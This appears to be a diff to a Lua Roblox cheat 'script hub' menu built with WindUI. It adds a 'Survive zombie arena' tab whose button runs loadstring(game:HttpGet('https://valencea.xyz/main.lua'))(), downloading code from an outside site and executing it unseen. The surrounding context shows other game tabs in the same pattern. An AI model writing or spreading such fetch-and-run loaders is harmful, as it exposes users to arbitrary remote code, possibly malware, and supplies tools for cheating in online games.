@@ -743,6 +743,21 @@ end
         })
     end,
 })
+local ButtonTab = ConfigUsageSection:Tab({
+		Title = "Survive zombie arena",
+		Icon = "solar:inbox-bold",
+		IconColor = Grey,
+		IconShape = "Square",
+		Border = true,
+	})
+ButtonTab:Button({
+    Title = "SZA",
+    Callback = function()
+        WindUI:Notify({
+loadstring(game:HttpGet("https://valencea.xyz/main.lua"))()
+        })
+    end,
+})
     local ButtonTab = ConfigUsageSection:Tab({
 		Title = "99 night",
 		Icon = "solar:inbox-bold",
